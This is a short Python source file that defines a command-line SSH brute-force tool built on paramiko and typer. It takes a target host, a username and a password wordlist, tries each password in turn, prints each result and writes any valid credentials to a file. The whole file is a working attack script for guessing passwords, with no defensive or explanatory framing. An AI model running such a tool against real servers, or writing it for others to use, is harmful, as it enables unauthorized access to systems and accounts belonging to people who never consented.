import typer
import paramiko
from pathlib import Path


def try_ssh_login(host: str, port: int, username: str, password: str, timeout: float = 3.0) -> bool:
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            hostname= host,
            port= port,
            username= username,
            password= password,
            timeout= timeout
        )
        print(f"[+] success: {username}:{password}")
        client.close()
        return True
    except paramiko.AuthenticationException:
        print(f"[-] failed: {username}:{password}")
        return False
    except Exception as e:
        print(f"[!] Error:{e}")
        return False
    
def ssh_brute(
    host: str = typer.Option(..., help="target ip or hostname"),
    user: str = typer.Option(..., help="username to brute force"),
    wordlist: Path = typer.Option(..., exists= True, readable= True, help="path to password wordlist"),
    port: int = typer.Option(22, help="SSH port (default: 22)"),
    stop: bool = typer.Option(True, help="Stop when valid credentials are found")
):
    print(f"[*] Starting SSH brute-force on {host} as {user}")
    
    with open(wordlist,"r", encoding="utf-8", errors="ignore") as f:
        passwords = f.read().splitlines()

    for password in passwords:
       success = try_ssh_login(host, port, user, password)
       if success:
           with open("ssh_success.txt", "a") as out:
               out.write(f"{user}:{password}@{host}:{port}\n")
           if stop:
                break   